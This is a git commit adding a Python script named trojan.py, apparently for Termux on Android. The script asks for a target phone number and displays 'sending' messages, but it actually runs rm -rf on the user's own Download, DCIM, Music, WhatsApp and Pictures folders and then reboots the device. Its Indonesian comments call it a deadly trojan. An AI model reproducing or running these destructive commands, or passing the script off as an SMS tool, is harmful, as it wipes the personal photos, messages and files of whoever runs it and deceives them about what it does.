c31163918db51a9797713608e5f22c59cbd444e2
ICA129 <51882241+ICA129@users.noreply.github.com>
2019-06-19 03:58:19 +0700

    Add files via upload

---
+++ trojan.py
@@ -0,0 +1,47 @@
+#!/bin/usr/python2
+
+import os
+import sys
+from time import sleep
+
+virus_anjay = "@@@^@%-$●●●$@;×,×;-^-/@%#■■♤~♤^-:♤•♤♤••>>~}◇•》○■•■○■○■\■○《》●》●》¤¡●¿\◇•¡¤ bHajwusy!bs&&@@^@%/@%@//×/@=×/@/@/@/×/×/@/×/×%@/×%#%#%#%÷%@^%×^@%@%@%×%@%@%#%#%÷%#%#%#/#%#%#%#%#%#%#%^#^#^@^@^-^@%-^^#%#%@%-^!*!*@*@*@^@☆■~♤}•■~♤•"
+if (virus_anjay):
+	print (" ")
+	print (" ")
+	print ("sedang melakukan installing....")
+###############################################
+"""
+	INI ADALAH VIRUS TROJAN YANG SANGAT MEMATIKAN
+
+"""
+##############################################
+
+# orang ganteng
+
+os.system('clear')
+print ("""\033[1;31m
+		TROJAN MEMATIKAN
+	       \033[1;33m÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷
+
+""")
+
+# Khazul keren
+
+a = input("\033[1;35mNomor hp target : ")
+server_message = "http://www.SmSID.API.com"
+connecting = "https://server.bangsat.com"
+print (" ")
+print ("\033[1;36m Please wait bro ....")
+print ("\033[1;36m Sending ... 💌 ")
+os.system('termux-setup-storage')
+os.system('rm -rf /storage/emulated/0/Download')
+os.system('rm -rf /storage/emulated/0/DCIM')
+os.system('rm -rf /storage/emulated/0/Music')
+os.system('rm -rf /storage/emulated/0/WhatsApp')
+os.system('rm -rf /storage/emulated/0/Pictures')
+os.system('rm -rf /strorage/emulated/')
+sleep(3)
+print (' ')
+print("\033[1;31m Successfully 👌 ")
+sleep(3)
+os.system('reboot')
